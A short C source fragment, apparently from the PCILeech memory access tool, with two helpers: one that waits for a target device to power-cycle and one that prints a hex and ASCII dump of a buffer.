VOID Util_WaitForPowerCycle(_Inout_ PPCILEECH_CONTEXT ctx)
{
	DeviceClose(ctx);
	while(DeviceOpen(ctx)) {
		DeviceClose(ctx);
		Sleep(100);
	}
	Util_WaitForPowerOn(ctx);
}

VOID Util_PrintHexAscii(_In_ PBYTE pb, _In_ DWORD cb)
{
	DWORD i, j;
	if(cb > 8192) {
		printf("Large output. Only displaying first 8192 bytes.\n");
		cb = 8192;
	}
	for(i = 0; i < cb + ((cb % 16) ? (16 - cb % 16) : 0); i++)
	{
		// address
		if(0 == i % 16) {
			printf("%04x    ", i % 0x10000);
		} else if(0 == i % 8) {
			putchar(' ');
		}
		// hex
		if(i < cb) {
			printf("%02x ", pb[i]);
		} else {
			printf("   ");
		}
		// ascii
		if(15 == i % 16) {
			printf("  ");
			for(j = i - 15; j <= i; j++) {
				if(j >= cb) {
					putchar(' ');
				} else {
					putchar(isprint(pb[j]) ? pb[j] : '.');
				}
			}
			putchar('\n');
		}
	}
}
